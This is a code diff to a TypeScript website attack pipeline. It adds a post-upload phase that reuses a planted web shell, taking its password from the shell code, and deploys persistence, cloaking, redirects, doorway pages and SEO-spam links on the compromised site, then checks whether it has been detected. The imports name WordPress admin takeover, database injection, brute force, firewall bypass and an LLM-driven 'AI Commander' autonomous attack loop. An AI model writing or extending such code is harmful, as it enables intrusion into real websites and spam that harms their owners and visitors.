@@ -28,6 +28,7 @@ import { sendTelegramNotification, type TelegramNotification } from "./telegram-
 import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
 import { proxyPool, fetchWithPoolProxy } from "./proxy-pool";
+import { generatePostUploadPayloads, deployPostUploadPayloads, runDetectionScan, type PostUploadReport, type DeployablePayload } from "./payload-arsenal";
 import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./non-wp-exploits";
@@ -67,12 +68,14 @@ export interface PipelineConfig {
   // AI Commander — LLM-driven autonomous attack loop
   enableAiCommander?: boolean;
   aiCommanderMaxIterations?: number;
+  // Post-upload payload deployment
+  enablePostUpload?: boolean;
   // User tracking
   userId?: number;
 }
 
 export interface PipelineEvent {
-  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force";
+  phase: "ai_analysis" | "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update" | "shellless" | "email" | "cf_bypass" | "wp_brute_force" | "post_upload";
   step: string;
   detail: string;
   progress: number; // 0-100
@@ -144,6 +147,10 @@ export interface PipelineResult {
   // WP Brute Force
   wpBruteForceResult?: BruteForceResult | null;
   wpAuthCredentials?: WPCredentials | null;
+  // Post-upload payload deployment
+  postUploadReport?: PostUploadReport | null;
+  // Detection scan
+  detectionScan?: { detections: any[]; liveChecks: any[] } | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -2487,6 +2494,95 @@ export async function runUnifiedAttackPipeline(
     }
   }
 
+  // ═══ POST-UPLOAD PAYLOAD DEPLOYMENT ═══
+  // After any successful upload, deploy additional payloads (persistence, cloaking, SEO manipulation)
+  let postUploadReport: PostUploadReport | null = null;
+  let detectionScanResult: { detections: any[]; liveChecks: any[] } | null = null;
+  const verifiedUploads = uploadedFiles.filter(f => f.verified && !f.method.startsWith("shellless_"));
+  
+  if (verifiedUploads.length > 0 && config.enablePostUpload !== false) {
+    const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+    const bestUpload = verifiedUploads[0];
+    
+    onEvent({
+      phase: "post_upload" as any,
+      step: "start",
+      detail: `\u{1F680} Post-Upload Phase: Deploying persistence, cloaking, SEO manipulation payloads via ${bestUpload.url}...`,
+      progress: 96,
+    });
+
+    try {
+      // Generate payloads based on what we know about the target
+      const payloads = generatePostUploadPayloads(domain, config.redirectUrl, {
+        enableSeoManipulation: true,
+        enablePersistence: true,
+        enableCloaking: true,
+        enableMonetization: false, // User must explicitly enable
+        enableRedirects: true,
+        doorwayCount: 20,
+        sitemapUrls: 100,
+        linkCount: 30,
+      });
+
+      onEvent({
+        phase: "post_upload" as any,
+        step: "payloads_generated",
+        detail: `\u{1F4CB} Generated ${payloads.length} post-upload payloads across ${new Set(payloads.map(p => p.category)).size} categories`,
+        progress: 97,
+      });
+
+      // Deploy payloads via the uploaded shell
+      // Determine shell password from the shell that was uploaded
+      const shellContent = typeof bestUpload.shell?.content === "string" ? bestUpload.shell.content : "";
+      const shellPassword = shellContent.match(/\$_(?:GET|POST|COOKIE)\['([^']+)'\]/)?.[1] || "_perf";
+      
+      postUploadReport = await deployPostUploadPayloads(
+        domain,
+        bestUpload.url,
+        shellPassword,
+        payloads,
+        (detail) => {
+          onEvent({
+            phase: "post_upload" as any,
+            step: "deploying",
+            detail,
+            progress: 97,
+          });
+        },
+      );
+
+      onEvent({
+        phase: "post_upload" as any,
+        step: "complete",
+        detail: `\u{2705} Post-upload: ${postUploadReport.successCount}/${payloads.length} payloads deployed (${postUploadReport.failCount} failed, ${(postUploadReport.totalTime / 1000).toFixed(1)}s)`,
+        progress: 98,
+        data: { successCount: postUploadReport.successCount, failCount: postUploadReport.failCount, totalTime: postUploadReport.totalTime },
+      });
+    } catch (error: any) {
+      errors.push(`Post-upload deployment error: ${error.message}`);
+      onEvent({
+        phase: "post_upload" as any,
+        step: "error",
+        detail: `\u{274C} Post-upload error: ${error.message}`,
+        progress: 98,
+      });
+    }
+
+    // Run detection scan after deployment
+    try {
+      detectionScanResult = await runDetectionScan(domain, (detail) => {
+        onEvent({
+          phase: "post_upload" as any,
+          step: "detection_scan",
+          detail,
+          progress: 99,
+        });
+      });
+    } catch {
+      // Detection scan is optional, don't fail the pipeline
+    }
+  }
+
   // ─── Emit final world state ───
   onEvent({
     phase: "world_update",
@@ -2572,6 +2668,10 @@ export async function runUnifiedAttackPipeline(
       totalDurationMs: aiCommanderResult.totalDurationMs,
       decisionsCount: aiCommanderResult.decisions.length,
     } : undefined,
+    // Post-upload payload deployment
+    postUploadReport: postUploadReport || undefined,
+    // Detection scan
+    detectionScan: detectionScanResult || undefined,
   };
 
   if (fullSuccess) {
